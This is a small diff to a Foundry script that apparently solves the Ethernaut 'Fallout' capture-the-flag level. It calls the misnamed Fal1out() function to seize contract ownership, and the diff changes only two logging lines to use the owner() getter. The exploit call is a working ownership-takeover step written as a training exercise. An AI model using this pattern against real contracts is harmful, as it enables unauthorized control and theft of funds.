@@ -21,9 +21,9 @@ contract Fallout_solution is Script {
         string memory mnemonic = vm.envString("MY_PRIVATE_KEY");
         uint256 deployerPrivateKey = vm.deriveKey(mnemonic, 0);
         vm.startBroadcast(deployerPrivateKey);
-        console.log("Owner before exploit:", falloutInstance.owner);
+        console.log("Owner before exploit:", falloutInstance.owner());
         falloutInstance.Fal1out();
-        console.log("Owner after exploit:", falloutInstance.owner);
+        console.log("Owner after exploit:", falloutInstance.owner());
         vm.stopBroadcast();
     }
 }
